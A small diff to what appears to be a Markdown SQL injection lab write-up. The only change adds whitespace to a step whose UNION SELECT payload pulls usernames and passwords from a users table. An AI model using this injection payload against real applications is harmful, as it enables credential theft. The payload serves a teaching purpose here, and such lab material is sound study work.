@@ -25,4 +25,4 @@ The application has a login function, and the database contains a table that hol
     - The query will return all the columns names from the users table
 
 - Get the usernames and passwords by using the following payload
-    ``` ' UNION SELECT <username-column>,<password-column> FROM <users-table-name> -- ```
+    ``` ' UNION SELECT <username-column>,<password-column> FROM <users-table-name> -- ``` 
